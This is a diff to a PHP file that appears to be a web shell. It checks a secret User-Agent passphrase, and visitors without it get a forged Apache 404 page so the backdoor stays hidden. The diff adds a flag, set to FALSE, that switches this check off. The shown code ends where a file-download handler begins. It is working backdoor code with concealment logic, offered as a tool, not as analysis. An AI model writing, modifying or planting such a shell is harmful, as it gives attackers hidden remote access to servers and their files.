@@ -1,23 +1,28 @@
 <?
+$use_auth = FALSE; // TODO: switch to TRUE before use
+
 error_reporting(0);
 
 set_time_limit(0);
 
 $shell = $_SERVER["PHP_SELF"];
 
-if ($_SERVER["HTTP_USER_AGENT"] != md5("LET_ME_IN")) // TODO: change pass-phrase before use
+if ($use_auth)
 {
-	exit( sprintf("
-		<h1>404 Not Found</h1>
-		<p>The requested URL %s was not found on this server.</p>
-		<hr>
-		<p><i>Apache/2.4.56 (Unix) OpenSSL/1.1.1 PHP/8.0.28 Server: <b>%s</b> Port: <b>%s</b></i></p>
-		",
-		$_SERVER["REQUEST_URI"],
-		$_SERVER["SERVER_ADDR"],
-		$_SERVER["SERVER_PORT"]
-		)
-	);
+	if ($_SERVER["HTTP_USER_AGENT"] != md5("LET_ME_IN")) // TODO: change pass-phrase before use
+	{
+		exit( sprintf("
+			<h1>404 Not Found</h1>
+			<p>The requested URL %s was not found on this server.</p>
+			<hr>
+			<p><i>Apache/2.4.56 (Unix) OpenSSL/1.1.1 PHP/8.0.28 Server: <b>%s</b> Port: <b>%s</b></i></p>
+			",
+			$_SERVER["REQUEST_URI"],
+			$_SERVER["SERVER_ADDR"],
+			$_SERVER["SERVER_PORT"]
+			)
+		);
+	}
 }
 
 if (isset($_POST["download"]))
